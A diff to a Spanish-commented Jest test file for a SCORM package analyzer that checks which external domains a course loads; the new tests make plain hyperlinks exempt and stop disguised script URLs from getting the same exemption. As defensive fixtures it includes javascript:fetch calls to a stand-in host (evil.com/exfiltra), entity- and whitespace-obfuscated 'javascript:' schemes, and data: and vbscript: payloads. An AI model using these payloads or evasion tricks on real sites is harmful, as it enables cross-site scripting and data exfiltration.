@@ -4,7 +4,7 @@
 // porque es el caso real: un paquete de DESPACHO cuyo contenido no está en el zip. La
 // verificación 3 del requerimiento es exactamente esta prueba.
 
-import { analizarManifiesto, cursoExternoDe } from '../scorm-manifiesto';
+import { analizarManifiesto, cursoExternoDe, dominiosDe } from '../scorm-manifiesto';
 
 const ENTREGADO = `<?xml version="1.0" encoding="UTF-8"?>
 <manifest identifier="SingleCourseManifest" version="1.1"
@@ -248,5 +248,151 @@ describe('cursoExternoDe · el id del curso de Coursebox, para cruzar con el web
   it('no revienta con basura ni con un token que no es base64 de una URL', () => {
     expect(cursoExternoDe(['course_token=no-es-base64-real'])).toBeNull();
     expect(cursoExternoDe([''])).toBeNull();
+  });
+});
+
+describe('un hipervínculo no es un origen de contenido', () => {
+  // Un `<a href>` NO carga nada y NO transmite nada: es una navegación que la persona puede
+  // tomar, con su propia sesión y en otra pestaña. Ninguna directiva de CSP la gobierna.
+  //
+  // Clasificarlo como DESPACHO hace que `abrirIntento` anote «correo y nombre → ese dominio»
+  // en la bitácora de datos a terceros. Es una afirmación falsa ante un auditor, y además le
+  // abre el dominio en la CSP. Es el mismo argumento del filtro de NAMESPACES.
+  const SOLO_ENLACE = `<html><body>
+    <h2>Practica en el sistema</h2>
+    <a href="https://org8fcf0faf.crm3.dynamics.com/main.aspx?etn=lead" target="_blank">Mis leads</a>
+  </body></html>`;
+
+  it('descarta el dominio que sólo aparece como destino de un <a href>', () => {
+    expect(dominiosDe(SOLO_ENLACE)).toEqual([]);
+  });
+
+  it('el paquete que sólo enlaza afuera es AUTOCONTENIDO', () => {
+    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
+      'shared/launch.html': SOLO_ENLACE,
+    });
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.paquete.clase).toBe('AUTOCONTENIDO');
+    expect(r.paquete.dominiosExternos).toEqual([]);
+  });
+
+  // **La otra mitad, y es la que prueba que esto no es una puerta.** Un despacho real CARGA
+  // al tercero. Si el mismo dominio aparece además cargándose, cuenta como antes.
+  it('el mismo dominio, si además se CARGA, sigue siendo DESPACHO', () => {
+    const enlazaYCarga = `<html><body>
+      <a href="https://proveedor.example.com/ayuda" target="_blank">Ayuda</a>
+      <script src="https://proveedor.example.com/driver.js"></script>
+    </body></html>`;
+
+    expect(dominiosDe(enlazaYCarga)).toEqual(['https://proveedor.example.com']);
+
+    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
+      'shared/launch.html': enlazaYCarga,
+    });
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.paquete.clase).toBe('DESPACHO');
+  });
+
+  it('un iframe al tercero sigue siendo DESPACHO aunque también haya un enlace', () => {
+    const conIframe = `<html><body>
+      <a href="https://proveedor.example.com/ayuda">Ayuda</a>
+      <iframe src="https://proveedor.example.com/curso?course_token=abc"></iframe>
+    </body></html>`;
+    expect(dominiosDe(conIframe)).toEqual(['https://proveedor.example.com']);
+  });
+
+  // Un `.js` no tiene `<a href>`, así que nada se descarta ahí. Es donde un driver de
+  // despacho arma la URL del proveedor, y ese escaneo no se toca.
+  it('no descarta nada dentro de un JavaScript', () => {
+    expect(dominiosDe(`var url = "https://proveedor.example.com/lanzar";`)).toEqual([
+      'https://proveedor.example.com',
+    ]);
+  });
+
+  // **El agujero que este filtro podría abrir, cerrado.** La exención vale para una
+  // NAVEGACIÓN: la persona se va al sitio del tercero, en otra pestaña y con su propia
+  // sesión. Un `javascript:` no es eso — corre en el documento actual, transmite al hacer
+  // clic, y la CSP sí lo gobierna (`connect-src`). Un `data:` tampoco: navega a un
+  // documento con origen opaco.
+  //
+  // El caso concreto que se colaba: `&quot;` NO es una comilla literal, así que el grupo
+  // `[^"']+` no se corta ahí y el dominio quedaba DENTRO del href capturado, contándose
+  // como destino de enlace. Con comillas reales el `'` corta la captura y ya se detectaba.
+  it('un href que no es navegación no gana la exención', () => {
+    expect(
+      dominiosDe(`<a href="javascript:fetch(&quot;https://evil.com/exfiltra&quot;)">Continuar</a>`),
+    ).toEqual(['https://evil.com']);
+    expect(
+      dominiosDe(`<a href="javascript:window.location.href=&quot;https://evil.com/go&quot;">x</a>`),
+    ).toEqual(['https://evil.com']);
+    expect(
+      dominiosDe(`<a href="data:text/html,<script>fetch('https://evil.com')</script>">x</a>`),
+    ).toEqual(['https://evil.com']);
+  });
+
+  // Y la contraparte: un enlace normal SIGUE exento, incluido el redirector, que es
+  // navegación aunque el destino final esté en la URL.
+  it('una navegación normal sigue exenta', () => {
+    expect(dominiosDe(`<a href="https://norma.example.com/iso27001">La norma</a>`)).toEqual([]);
+    expect(
+      dominiosDe(`<a href="https://link.example.com/r?u=https://destino.example.com">ir</a>`),
+    ).toEqual([]);
+    expect(dominiosDe(`<a href="//cdn.example.com/pagina">x</a>`)).toEqual([]);
+    expect(dominiosDe(`<a href="   https://norma.example.com/x">x</a>`)).toEqual([]);
+  });
+
+  // **Ofuscaciones del esquema.** Las seis las EJECUTA el navegador: el parser de HTML
+  // decodifica las entidades del valor del atributo antes de que la URL exista, y el
+  // analizador de URL descarta TAB, LF, CR y los controles C0 iniciales antes de leer el
+  // esquema. Preguntar «¿qué esquema declara?» obliga a reproducir esa normalización con
+  // expresiones regulares, que es donde vive una familia entera de evasiones.
+  //
+  // La pregunta que sí discrimina es otra: **¿el `href` ES la URL, o la lleva ADENTRO de
+  // otra cosa?** Las seis la llevan adentro, y ninguna empieza por ella.
+  it('ninguna ofuscación del esquema gana la exención', () => {
+    const casos = [
+      `<a href="&#106;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="&#x6a;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java\tscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java\nscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="java&#9;script:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+      `<a href="javascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
+    ];
+    // En bloque y no en un bucle: un `for` con `expect` adentro corta en el primero que
+    // falla y esconde los otros cinco. Así el rojo muestra las seis de una.
+    expect(casos.map(dominiosDe)).toEqual(casos.map(() => ['https://evil.com']));
+  });
+
+  // **Una URL RELATIVA también es navegación.** Exigir que el `href` empiece por `http://`
+  // le quitó la exención a los enlaces relativos, y con eso reapareció —en un caso angosto—
+  // justo el defecto que este filtro vino a cerrar: un curso que sale por un redirector
+  // interno volvía a clasificarse DESPACHO.
+  //
+  // «Relativa» es lo que dice el RFC 3986 §3.1: **no hay `:` antes del primer `/`, `?` o
+  // `#`**. Aplicado al HTML crudo eso no alcanza —el `#` de `&#106;` se lee como delimitador
+  // de fragmento y la ofuscación vuelve a colarse—, así que antes se exige que el `href` sea
+  // LLANO: sin referencias numéricas y sin caracteres de control. Un enlace a una norma no
+  // lleva ninguna de las dos cosas; las dos formas conocidas de disfrazar un esquema, sí.
+  it('una URL relativa sigue siendo navegación', () => {
+    // El caso realista: un curso que sale por su propia página de despedida.
+    expect(
+      dominiosDe(`<a href="salir.html?volver=https://intranet.empresa.com">Volver</a>`),
+    ).toEqual([]);
+    expect(dominiosDe(`<a href="/ir?u=https://destino.example.com">ir</a>`)).toEqual([]);
+    expect(dominiosDe(`<a href="./ir?u=https://destino.example.com">ir</a>`)).toEqual([]);
+    expect(dominiosDe(`<a href="?volver=https://intranet.empresa.com">volver</a>`)).toEqual([]);
+  });
+
+  // La contraparte de la regla de arriba, y la que impide que sea una puerta: lo llano abre
+  // la exención, pero un esquema que no es de navegación la cierra igual aunque el `href`
+  // sea impecable en todo lo demás.
+  it('un esquema ajeno no se cuela por ser llano', () => {
+    const casos = [
+      `<a href="data:text/html,<span>fetch('https://evil.com')</span>">x</a>`,
+      `<a href="vbscript:msgbox(&quot;https://evil.com&quot;)">x</a>`,
+    ];
+    expect(casos.map(dominiosDe)).toEqual(casos.map(() => ['https://evil.com']));
   });
 });
